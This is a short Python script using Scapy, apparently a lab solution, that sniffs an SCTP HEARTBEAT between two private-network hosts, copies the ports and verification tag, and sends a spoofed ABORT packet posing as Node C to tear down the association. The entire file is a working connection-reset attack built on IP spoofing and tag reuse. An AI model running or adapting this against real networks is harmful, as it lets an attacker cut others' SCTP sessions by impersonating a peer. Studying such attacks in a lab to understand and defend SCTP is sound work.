from scapy.all import *

# Function to check if a packet is an SCTP HEARTBEAT from Node S to Node C
def is_heartbeat_packet(pkt):
    return (SCTP in pkt and 
            SCTPChunkHeartbeatReq in pkt and 
            pkt[IP].src == "10.0.2.50" and 
            pkt[IP].dst == "10.0.2.100")

# Step 1: Monitor and capture a HEARTBEAT packet
print("Monitoring network for SCTP HEARTBEAT packet from 10.0.2.50 to 10.0.2.100...")
packets = sniff(filter="sctp", prn=lambda x: x, stop_filter=is_heartbeat_packet, count=1)

if not packets:
    print("No HEARTBEAT packet captured. Exiting.")
    exit(1)

# Extract the first captured packet
heartbeat_pkt = packets[0]

# Extract and print required fields
src_ip = heartbeat_pkt[IP].src
dst_ip = heartbeat_pkt[IP].dst
src_port = heartbeat_pkt[SCTP].sport
dst_port = heartbeat_pkt[SCTP].dport
vtag = heartbeat_pkt[SCTP].tag

print("\nCaptured HEARTBEAT packet details:")
print(f"Source IP: {src_ip}")
print(f"Destination IP: {dst_ip}")
print(f"Source Port: {src_port}")
print(f"Destination Port: {dst_port}")
print(f"Verification Tag: {vtag:#010x}")

# Step 2: Sniffing stops automatically due to count=1

# Step 3: Construct SCTP ABORT packet
abort_pkt = (
    IP(src="10.0.2.100", dst="10.0.2.50") /
    SCTP(sport=dst_port, dport=src_port, tag=vtag) /
    SCTPChunkAbort()
)

print("\nABORT packet parameters:")
print(f"Source IP: 10.0.2.100 (spoofed as Node C)")
print(f"Destination IP: 10.0.2.50 (Node S)")
print(f"Source Port: {dst_port}")
print(f"Destination Port: {src_port}")
print(f"Verification Tag: {vtag:#010x}")
print("Chunk Type: ABORT")

# Step 4: Send the ABORT packet to Node S
print("\nSending ABORT packet to Node S (10.0.2.50)...")
send(abort_pkt, verbose=False)
print("ABORT packet sent.")